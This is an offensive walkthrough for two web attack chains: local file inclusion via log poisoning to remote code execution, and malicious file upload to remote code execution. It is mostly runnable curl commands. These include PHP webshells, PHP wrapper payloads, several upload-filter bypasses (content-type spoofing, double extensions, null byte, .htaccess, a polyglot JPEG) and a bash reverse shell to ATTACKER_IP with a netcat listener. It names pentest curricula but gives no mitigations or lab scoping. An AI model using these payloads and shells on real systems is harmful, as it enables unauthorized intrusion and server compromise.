# LFI-to-RCE Chain and File-Upload-to-RCE Chain

These are standard web application exploitation techniques covered in penetration testing curricula (OSCP, CEH, GPEN, etc.).

---

## Chain 1: LFI → RCE (Log Poisoning Method)

### Step-by-Step

**Step 1 — Discover the LFI vulnerability**

Probe a parameter that includes files (common parameter names: `page`, `file`, `template`, `include`, `path`).

```bash
curl "http://target/index.php?page=../../../../etc/passwd"
```

If you see the contents of `/etc/passwd`, LFI is confirmed.

---

**Step 2 — Identify the web server log path**

Common paths:
- Apache: `/var/log/apache2/access.log` or `/var/log/httpd/access_log`
- Nginx: `/var/log/nginx/access.log`

```bash
curl "http://target/index.php?page=../../../../var/log/apache2/access.log"
```

If you see log entries (IP addresses, timestamps), you've confirmed the path.

---

**Step 3 — Poison the log with PHP code**

Send a request where the **User-Agent** header contains your PHP payload. The web server will log it.

```bash
curl -A "<?php system($_GET['cmd']); ?>" "http://target/"
```

**Payload injected into the log:**
```php
<?php system($_GET['cmd']); ?>
```

The log file now contains something like:
```
192.168.1.10 - - [01/Jan/2025] "GET / HTTP/1.1" 200 1234 "-" "<?php system($_GET['cmd']); ?>"
```

---

**Step 4 — Include the poisoned log via LFI to trigger execution**

```bash
curl "http://target/index.php?page=../../../../var/log/apache2/access.log&cmd=id"
```

**Expected output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The PHP code in the log is now **interpreted and executed** by the server.

---

**Step 5 — Upgrade to full shell (optional)**

```bash
curl "http://target/index.php?page=../../../../var/log/apache2/access.log&cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261'"
```

With a listener on the attacker machine:
```bash
nc -lvnp 4444
```

---

### Alternative LFI-to-RCE Methods (same chain structure)

| Method | Payload in Step 3 | Include Path in Step 4 |
|---|---|---|
| **PHP wrappers** | Send PHP in POST body | `page=php://input` |
| **data:// wrapper** | N/A | `page=data://text/plain,<?php system($_GET['cmd']); ?>` |
| **Session poisoning** | `<?php system($_GET['cmd']); ?>` as session value | `page=/var/lib/php/sessions/sess_SESSIONID` |
| **/proc/self/environ** | Poison `User-Agent` | `page=/proc/self/environ` |
| **expect:// wrapper** | N/A | `page=expect://id` |

**PHP wrapper example:**
```bash
curl -X POST -d "<?php system($_GET['cmd']); ?>" "http://target/index.php?page=php://input&cmd=id"
```

**data:// wrapper example:**
```bash
curl "http://target/index.php?page=data://text/plain,<?php system(\$_GET['cmd']); ?>&cmd=id"
```

---

## Chain 2: File Upload → RCE

### Step-by-Step

**Step 1 — Discover the file upload form**

Browse the target application for upload functionality (common pages: `/upload.php`, `/upload`, `/admin/upload`, `/filemanager`).

```bash
curl -s "http://target/" | grep -i "upload"
```

---

**Step 2 — Create the malicious payload (PHP webshell)**

```bash
cat > shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
EOF
```

Or a minimal one-liner:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

---

**Step 3 — Upload the file (initial attempt)**

```bash
curl -F "file=@shell.php" "http://target/upload.php"
```

**Likely result:** Rejected due to extension filter, content-type check, or MIME validation.

---

**Step 4 — Bypass upload restrictions**

**Bypass A — Content-Type spoofing:**
```bash
curl -F "file=@shell.php;type=image/jpeg" "http://target/upload.php"
```

**Bypass B — Extension bypass (double extension):**
```bash
cp shell.php shell.php.jpg
curl -F "file=@shell.php.jpg" "http://target/upload.php"
```

**Bypass C — Null byte (older PHP):**
```bash
curl -F "file=@shell.php;filename=shell.php%00.jpg" "http://target/upload.php"
```

**Bypass D — Alternative extension:**
```bash
cp shell.php shell.phtml
curl -F "file=@shell.phtml" "http://target/upload.php"
```

(Other allowed extensions: `.php5`, `.php7`, `.pht`, `.phar`, `.inc`)

**Bypass E — .htaccess upload (if Apache allows):**
```bash
echo "AddType application/x-httpd-php .jpg" > .htaccess
curl -F "file=@.htaccess" "http://target/upload.php"
cp shell.php shell.jpg
curl -F "file=@shell.jpg" "http://target/upload.php"
```

**Bypass F — Image with embedded PHP (polyglot):**
```bash
# Create a valid JPEG that contains PHP
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > shell.jpg
curl -F "file=@shell.jpg" "http://target/upload.php"
```

---

**Step 5 — Locate the uploaded file**

Common upload paths:
- `/uploads/shell.php`
- `/images/shell.php`
- `/files/shell.php`
- `/media/shell.php`
- `/tmp/shell.php`

```bash
curl -s "http://target/uploads/shell.php"
```

If you get a response (even an error), the file exists.

---

**Step 6 — Execute commands through the webshell**

```bash
curl "http://target/uploads/shell.php?cmd=id"
```

**Expected output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

**Step 7 — Establish a reverse shell**

```bash
curl "http://target/uploads/shell.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261'"
```

Listener:
```bash
nc -lvnp 4444
```

---

## Summary Comparison

| Aspect | LFI-to-RCE | File-Upload-to-RCE |
|---|---|---|
| **Vulnerability** | Unsanitized file inclusion | Unrestricted file upload |
| **Key step** | Poison a readable file, then include it | Upload executable PHP, then access it |
| **Payload delivery** | Log headers, POST body, session data | Multipart form file upload |
| **Execution trigger** | Include the poisoned file path | Request the uploaded file directly |
| **Common bypass** | PHP wrappers, log path discovery | Content-type spoofing, extension bypass |
| **Final command** | `?cmd=id` or reverse shell | `?cmd=id` or reverse shell |

Both chains converge on the same goal: **arbitrary command execution as the web server user**, which is then escalated to full system compromise.